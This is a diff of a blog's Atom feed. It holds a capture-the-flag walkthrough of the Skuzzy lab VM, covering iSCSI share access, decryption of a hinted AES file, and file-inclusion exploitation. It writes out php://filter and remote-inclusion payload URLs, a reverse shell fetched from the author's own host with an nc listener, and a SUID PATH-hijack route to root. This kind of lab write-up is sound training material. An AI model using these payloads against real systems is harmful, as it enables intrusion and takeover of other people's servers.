@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | CyberSlave]]></title>
   <link href="http://ryanoberto.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://ryanoberto.github.io/"/>
-  <updated>2017-03-28T14:20:11+02:00</updated>
+  <updated>2017-03-28T14:23:55+02:00</updated>
   <id>http://ryanoberto.github.io/</id>
   <author>
     <name><![CDATA[Ryan Oberto]]></name>
@@ -22,76 +22,133 @@
 
 <p>After booting the image in VirtualBox we are greeted with the below, showing us the current ip</p>
 
-<p>{% img <a href="https://ryanoberto.github.io/images/ew_login.png">https://ryanoberto.github.io/images/ew_login.png</a> %}</p>
+<p><img class="<a" src="href="https://ryanoberto.github.io/images/ew_login.png">https://ryanoberto.github.io/images/ew_login.png</a>&#8221;></p>
 
 <p>Fire off nmap for service discovery.
-&#8220;`
-~/EW_Skuzzy # nmap -A -p- 10.0.2.6</p>
-
-<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-03-28 11:00 SAST
-sendto in send_ip_packet_sd: sendto(6, packet, 44, 0, 10.0.2.6, 16) => Operation not permitted
-Offending packet: TCP 10.0.2.5:43419 > 10.0.2.6:25786 S ttl=57 id=14425 iplen=44  seq=2325605450 win=1024 <mss 1460>
-Nmap scan report for 10.0.2.6
-Host is up (0.00029s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)
-|<em>  256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)
-80/tcp   open  http    nginx
-|</em>http-server-header: nginx
-|<em>http-title: Welcome!
-3260/tcp open  iscsi?
-|</em>iscsi-info: ERROR: Script execution failed (use -d to debug)
-MAC Address: 08:00:27:60:88:83 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.6
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-
-<p>TRACEROUTE
-HOP RTT     ADDRESS
-1   0.29 ms 10.0.2.6</p>
-
-<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 102.47 seconds</p>
-
-<pre><code>So we have port 22,80 and 3260.
-
-Opening firefox and connecting to the server greets us with: 
-
-{% img https://ryanoberto.github.io/images/ew_http.png %}
-
-After running dirbuster and coming up with only trolls, I moved on to port 3260.
-
-Not knowing much about iscsi I went off to do a bit of reading.
-
-Following the instructions set out [here](https://help.ubuntu.com/lts/serverguide/iscsi-initiator.html) mounted the share under /mnt/temp
-</code></pre>
-
-<p>/mnt/temp # ls
-bobsdisk.dsk  flag1.txt  lost+found
-&#8220;`</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>~/EW_Skuzzy # nmap -A -p- 10.0.2.6&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Starting Nmap 7.40 ( &lt;a href="https://nmap.org"&gt;https://nmap.org&lt;/a&gt; ) at 2017-03-28 11:00 SAST
+</span><span class='line'>sendto in send_ip_packet_sd: sendto(6, packet, 44, 0, 10.0.2.6, 16) =&gt; Operation not permitted
+</span><span class='line'>Offending packet: TCP 10.0.2.5:43419 &gt; 10.0.2.6:25786 S ttl=57 id=14425 iplen=44  seq=2325605450 win=1024 &lt;mss 1460&gt;
+</span><span class='line'>Nmap scan report for 10.0.2.6
+</span><span class='line'>Host is up (0.00029s latency).
+</span><span class='line'>Not shown: 65532 closed ports
+</span><span class='line'>PORT     STATE SERVICE VERSION
+</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)
+</span><span class='line'>|&lt;em&gt;  256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)
+</span><span class='line'>80/tcp   open  http    nginx
+</span><span class='line'>|&lt;/em&gt;http-server-header: nginx
+</span><span class='line'>|&lt;em&gt;http-title: Welcome!
+</span><span class='line'>3260/tcp open  iscsi?
+</span><span class='line'>|&lt;/em&gt;iscsi-info: ERROR: Script execution failed (use -d to debug)
+</span><span class='line'>MAC Address: 08:00:27:60:88:83 (Oracle VirtualBox virtual NIC)
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 3.X|4.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span><span class='line'>OS details: Linux 3.2 - 4.6
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.29 ms 10.0.2.6&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;OS and Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/"&gt;https://nmap.org/submit/&lt;/a&gt; .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 102.47 seconds&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;So we have port 22,80 and 3260.
+</span><span class='line'>
+</span><span class='line'>Opening firefox and connecting to the server greets us with: 
+</span><span class='line'>
+</span><span class='line'><img src="https://ryanoberto.github.io/images/ew_http.png">
+</span><span class='line'>
+</span><span class='line'>After running dirbuster and coming up with only trolls, I moved on to port 3260.
+</span><span class='line'>
+</span><span class='line'>Not knowing much about iscsi I went off to do a bit of reading.
+</span><span class='line'>
+</span><span class='line'>Following the instructions set out [here](https://help.ubuntu.com/lts/serverguide/iscsi-initiator.html) mounted the share under /mnt/temp
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;/mnt/temp # ls
+</span><span class='line'>bobsdisk.dsk  flag1.txt  lost+found</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Flag 1
-&#8220;`
-/mnt/temp # cat flag1.txt
-Congratulations! You&rsquo;ve discovered the first flag!</p>
-
-<p>flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}</p>
-
-<h2>Let&rsquo;s see how you go with the next one&hellip;</h2>
-
-<pre><code>
-Check file type
-</code></pre>
-
-<p>/mnt/temp # file bobsdisk.dsk
-bobsdisk.dsk: Linux rev 1.0 ext2 filesystem data, UUID=faef0c66-b61b-4d80-8c20-5e8da65345d4 (large files)
-&#8220;`
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/mnt/temp # cat flag1.txt
+</span><span class='line'>Congratulations! You&rsquo;ve discovered the first flag!&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;Let&rsquo;s see how you go with the next one&hellip;&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;
+</span><span class='line'>Check file type
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;/mnt/temp # file bobsdisk.dsk
+</span><span class='line'>bobsdisk.dsk: Linux rev 1.0 ext2 filesystem data, UUID=faef0c66-b61b-4d80-8c20-5e8da65345d4 (large files)</span></code></pre></td></tr></table></div></figure>
 Create directory and mount the disk image</p>
 
 <pre><code>/mnt/temp # mkdir /mnt/disk
@@ -99,46 +156,82 @@ Create directory and mount the disk image</p>
 </code></pre>
 
 <p>List the content of the image
-&#8220;`
-/mnt/disk # ls</p>
-
-<h2>lost+found  ToAlice.csv.enc  ToAlice.eml</h2>
-
-<pre><code>Checking what type of file we have here.
-</code></pre>
-
-<p>/mnt/disk # file ToAlice.csv.enc</p>
-
-<h2>ToAlice.csv.enc: openssl enc&rsquo;d data with salted password</h2>
-
-<pre><code>
-Flag 2
-</code></pre>
-
-<p>/mnt/disk # cat ToAlice.eml</p>
-
-<p>G&#8217;day Alice,</p>
-
-<p>You know what really annoys me? How you and I ended up being used, like some kind of guinea pigs, by the RSA crypto wonks as actors in their designs for public key crypto&hellip; I don&rsquo;t recall ever being asked if that was ok? I never got even one cent of royalties from them!? RSA have made Millions on our backs, and it&rsquo;s time we took a stand!</p>
-
-<p>Starting now, today, immediately, I&rsquo;m never using asymmetric key encryption again, and it&rsquo;s all symmetric keys from here on out. All my files and documents will be encrypted with that popular symmetric crypto algorithm. Uh. Yeah, I can&rsquo;t pronounce its original name. I don&rsquo;t even know what the letters in its other name stand for - but really - that&rsquo;s not important. A bloke at my local hackerspace says its the beez kneez, ridgy-didge, real-deal, the best there is when it comes to symmetric key crypto, he has heaps of stickers on his laptop so I guess it means he knows, right? Anyway, he said it won some big important competition among crypto geeks in October 2000? Lucky Y2K didn&rsquo;t happen then, I suppose or that would have been one boring party!</p>
-
-<p>Anyway this algorithm sounded good to me. I used the updated version that won the competition.</p>
-
-<p>You know what happened to me this morning? My kids, the little darlings, had spilled their fancy 256 bit Lego kit all over the damn floor. Sigh. Of course I trod on it making my coffee, the level of pain really does ROCKYOU to the core when it happens! It&rsquo;s hard to stay mad though, I really love Lego, the way those blocks chain togeather really does make them work brilliantly. My favourite new Spanish swear came in handy when this happened&hellip; supercalifragilisticoespialidoso !</p>
-
-<p>Anyway, given I&rsquo;m not not using asymmetric crypto any longer, I destroyed my private key, so the public key you have for me may as well be deleted. I&rsquo;ve got some notes for you which might help in your current case, I&rsquo;ve encrypted it using my new favourite symmetric key crypto algorithm, it should be on the disk with this note. The key is, well, one awesome word I learnt in my recent Spanish classes!</p>
-
-<p>Give me a shout when you&rsquo;re down this way again, we&rsquo;ll catch up for coffee (once the Lego is removed from my foot) :)</p>
-
-<p>Cheers,</p>
-
-<p>Bob.</p>
-
-<p>PS: Oh, before I forget, the hacker-kid who told me how to use this new algorithm, said it was very important I used the command option -md sha256 when decrypting. Why? Who knows? He said something about living on the bleeding-edge&hellip;</p>
-
-<p>PPS: flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}
-&#8220;`
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/mnt/disk # ls&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;lost+found  ToAlice.csv.enc  ToAlice.eml&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;Checking what type of file we have here.
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;/mnt/disk # file ToAlice.csv.enc&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;ToAlice.csv.enc: openssl enc&rsquo;d data with salted password&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;
+</span><span class='line'>Flag 2
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;/mnt/disk # cat ToAlice.eml&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;G'day Alice,&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;You know what really annoys me? How you and I ended up being used, like some kind of guinea pigs, by the RSA crypto wonks as actors in their designs for public key crypto&hellip; I don&rsquo;t recall ever being asked if that was ok? I never got even one cent of royalties from them!? RSA have made Millions on our backs, and it&rsquo;s time we took a stand!&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Starting now, today, immediately, I&rsquo;m never using asymmetric key encryption again, and it&rsquo;s all symmetric keys from here on out. All my files and documents will be encrypted with that popular symmetric crypto algorithm. Uh. Yeah, I can&rsquo;t pronounce its original name. I don&rsquo;t even know what the letters in its other name stand for - but really - that&rsquo;s not important. A bloke at my local hackerspace says its the beez kneez, ridgy-didge, real-deal, the best there is when it comes to symmetric key crypto, he has heaps of stickers on his laptop so I guess it means he knows, right? Anyway, he said it won some big important competition among crypto geeks in October 2000? Lucky Y2K didn&rsquo;t happen then, I suppose or that would have been one boring party!&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Anyway this algorithm sounded good to me. I used the updated version that won the competition.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;You know what happened to me this morning? My kids, the little darlings, had spilled their fancy 256 bit Lego kit all over the damn floor. Sigh. Of course I trod on it making my coffee, the level of pain really does ROCKYOU to the core when it happens! It&rsquo;s hard to stay mad though, I really love Lego, the way those blocks chain togeather really does make them work brilliantly. My favourite new Spanish swear came in handy when this happened&hellip; supercalifragilisticoespialidoso !&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Anyway, given I&rsquo;m not not using asymmetric crypto any longer, I destroyed my private key, so the public key you have for me may as well be deleted. I&rsquo;ve got some notes for you which might help in your current case, I&rsquo;ve encrypted it using my new favourite symmetric key crypto algorithm, it should be on the disk with this note. The key is, well, one awesome word I learnt in my recent Spanish classes!&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Give me a shout when you&rsquo;re down this way again, we&rsquo;ll catch up for coffee (once the Lego is removed from my foot) :)&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Cheers,&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Bob.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;PS: Oh, before I forget, the hacker-kid who told me how to use this new algorithm, said it was very important I used the command option -md sha256 when decrypting. Why? Who knows? He said something about living on the bleeding-edge&hellip;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;PPS: flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}</span></code></pre></td></tr></table></div></figure>
 Going off the above clues we decode the email.</p>
 
 <pre><code>$ openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
@@ -159,7 +252,7 @@ flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? Wha
 
 <p><a href="http://10.0.2.6/5560a1468022758dba5e92ac8f2353c0">http://10.0.2.6/5560a1468022758dba5e92ac8f2353c0</a></p>
 
-<p>{% img <a href="https://ryanoberto.github.io/images/ew_5560a1468022758dba5e92ac8f2353c0.png">https://ryanoberto.github.io/images/ew_5560a1468022758dba5e92ac8f2353c0.png</a> %}</p>
+<p><img class="<a" src="href="https://ryanoberto.github.io/images/ew_5560a1468022758dba5e92ac8f2353c0.png">https://ryanoberto.github.io/images/ew_5560a1468022758dba5e92ac8f2353c0.png</a>&#8221;></p>
 
 <p>viewing the source gives us some base64 encoded text which decodes to</p>
 
@@ -184,21 +277,21 @@ Soup Nazi: NO FLAG FOR YOU
 
 <p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=welcome">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=welcome</a></p>
 
-<p>{% img <a href="https://ryanoberto.github.io/images/ew_welcome.png">https://ryanoberto.github.io/images/ew_welcome.png</a> %}</p>
+<p><img class="<a" src="href="https://ryanoberto.github.io/images/ew_welcome.png">https://ryanoberto.github.io/images/ew_welcome.png</a>&#8221;></p>
 
 <p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=flag">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=flag</a></p>
 
-<p>{% img <a href="https://ryanoberto.github.io/images/ew_flag.png">https://ryanoberto.github.io/images/ew_flag.png</a> %}</p>
+<p><img class="<a" src="href="https://ryanoberto.github.io/images/ew_flag.png">https://ryanoberto.github.io/images/ew_flag.png</a>&#8221;></p>
 
 <p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=party">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=party</a></p>
 
-<p>{% img <a href="https://ryanoberto.github.io/images/ew_party.png">https://ryanoberto.github.io/images/ew_party.png</a> %}</p>
+<p><img class="<a" src="href="https://ryanoberto.github.io/images/ew_party.png">https://ryanoberto.github.io/images/ew_party.png</a>&#8221;></p>
 
 <p>What have we here, below looks vulnerable to a LFI and RFI</p>
 
 <p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt</a></p>
 
-<p>{% img <a href="https://ryanoberto.github.io/images/ew_reader.png">https://ryanoberto.github.io/images/ew_reader.png</a> %}</p>
+<p><img class="<a" src="href="https://ryanoberto.github.io/images/ew_reader.png">https://ryanoberto.github.io/images/ew_reader.png</a>&#8221;></p>
 
 <p>Convert the pages to base64 and download them</p>
 
@@ -213,31 +306,52 @@ Soup Nazi: NO FLAG FOR YOU
 <p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php</a></p>
 
 <p>Flag 4
-&#8220;`
-~/EW_Skuzzy # cat flag.php
-&lt;?php
-defined (&lsquo;VIAINDEX&rsquo;) or die(&lsquo;Ooooh! So close..&rsquo;);
-?></p>
-
-<h1>Flag</h1>
-
-
-<p>Hmm. Looking for a flag? Come on&#8230; I haven&#8217;t made it easy yet, did you think I was going to this time?</p>
-
-
-<p><img src="trollface.png" />
-&lt;?php
-// Ok, ok. Here&rsquo;s your flag!
-//
-// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
-//
-// Well done, you&rsquo;re doing great so far!
-// Next step. SHELL!
-//
-//
-// Oh. That flag above? You&rsquo;re gonna need it&hellip;
-?>
-&#8220;`</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>~/EW_Skuzzy # cat flag.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>defined (&lsquo;VIAINDEX&rsquo;) or die(&lsquo;Ooooh! So close..&rsquo;);
+</span><span class='line'>?&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Flag&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;&lt;img src="trollface.png" /&gt;
+</span><span class='line'>&lt;?php
+</span><span class='line'>// Ok, ok. Here&rsquo;s your flag!
+</span><span class='line'>//
+</span><span class='line'>// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+</span><span class='line'>//
+</span><span class='line'>// Well done, you&rsquo;re doing great so far!
+</span><span class='line'>// Next step. SHELL!
+</span><span class='line'>//
+</span><span class='line'>//
+</span><span class='line'>// Oh. That flag above? You&rsquo;re gonna need it&hellip;
+</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Download reader.php source</p>
 
@@ -327,7 +441,7 @@ We know from the above code we require a key and that it needs to be 47 char lon
 
 http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/data.txt
 
-{% img https://ryanoberto.github.io/images/ew_lfi.png %}
+<img src="https://ryanoberto.github.io/images/ew_lfi.png">
 
 Using the following [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) copied to the webserver directory renamed to data.txt
 and changed the &lt;?php ?&gt; to ##php##
@@ -343,7 +457,7 @@ Browse to the url
 
 http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://10.0.2.5/data.txt
 
-{% img https://ryanoberto.github.io/images/ew_rfi.png %}
+<img src="https://ryanoberto.github.io/images/ew_rfi.png">
 </code></pre>
 
 <p>/opt # nc -lvp 8888
@@ -393,8 +507,9 @@ find / -perm -4000 2&gt;/dev/null
 /bin/ping6
 /bin/umount
 /opt/alicebackup
-</code>
-/opt/alicebackup looks interesting, running it we can see it runs the id command before trying to connect to alice.home</p>
+</code></p>
+
+<p>/opt/alicebackup looks interesting, running it we can see it runs the id command before trying to connect to alice.home</p>
 
 <pre><code>www-data@skuzzy:/opt$ ./alicebackup
 ./alicebackup
@@ -421,29 +536,30 @@ bash: groups: command not found
 root@skuzzy:/opt# 
 </code></pre>
 
-<p>Fix our PATH
-<code>
+<p>Fix the PATH</p>
+
+<pre><code>
 root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
-</code></p>
+</code></pre>
 
-<p>Flag 5
-&#8220;`
-root@skuzzy:/root# cat flag.txt
-Congratulations!</p>
+<p>Flag 5</p>
 
-<p>flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}</p>
+<pre><code>root@skuzzy:/root# cat flag.txt
+Congratulations!
 
-<p>You&rsquo;ve found the final flag and pwned this CTF VM!</p>
+flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
 
-<p>I really hope this was an enjoyable challenge, and that my trolling and messing with you didn&rsquo;t upset you too much! I had a blast making this VM, so it won&rsquo;t be my last!</p>
+You've found the final flag and pwned this CTF VM!
 
-<p>I&rsquo;d love to hear your thoughts on this one.
+I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!
+
+I'd love to hear your thoughts on this one.
 Too easy?
 Too hard?
-Too much stuff to install to get the iSCSI initiator working?</p>
+Too much stuff to install to get the iSCSI initiator working?
 
-<p>Drop me a line on twitter @vortexau, or via email <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#118;&#111;&#x72;&#116;&#x65;&#120;&#x40;&#x6a;&#117;&#105;&#99;&#101;&#100;&#x69;&#x67;&#x69;&#x74;&#97;&#108;&#46;&#110;&#101;&#x74;">&#118;&#x6f;&#114;&#x74;&#101;&#120;&#64;&#x6a;&#117;&#x69;&#99;&#101;&#100;&#x69;&#x67;&#x69;&#x74;&#97;&#108;&#x2e;&#110;&#x65;&#x74;</a>
-&#8220;`</p>
+Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
+</code></pre>
 
 <p>This was great fun and learnt something new, Thanks <a href="https://twitter.com/@vortexau">@vortexau</a></p>
 ]]></content>
